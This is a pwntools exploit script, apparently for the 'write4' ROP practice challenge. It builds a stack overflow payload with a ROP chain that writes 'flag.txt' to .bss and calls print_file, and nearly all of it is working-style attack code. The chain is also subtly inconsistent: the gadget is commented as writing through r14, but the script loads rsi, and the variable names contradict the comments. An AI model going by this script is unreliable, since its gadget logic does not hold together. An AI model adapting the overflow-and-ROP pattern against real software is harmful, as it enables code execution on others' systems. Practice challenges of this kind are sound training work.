from pwn import *
elf= context.binary= ELF('./write4', checksec=False)
p=process(elf.path)
##  WRITE64

offset= 40
bss=0x00601038
printfile=0x00400510
pop_rsi_r15=0x00400690 ##pop rsi; pop r15; ret;
mov_qword_rsi_rax=0x00400628 ##mov qword ptr [r14], r15; ret;
pop_rdi_ret=0x00400693 ##pop rdi; ret;
payload  = b"A" * offset
# 1. set RSI = indirizzo di destinazione (bss)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += b"flag.txt"            # filler per r15
payload += p64(mov_qword_rsi_rax)
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(printfile)


p.sendline(payload)
p.interactive()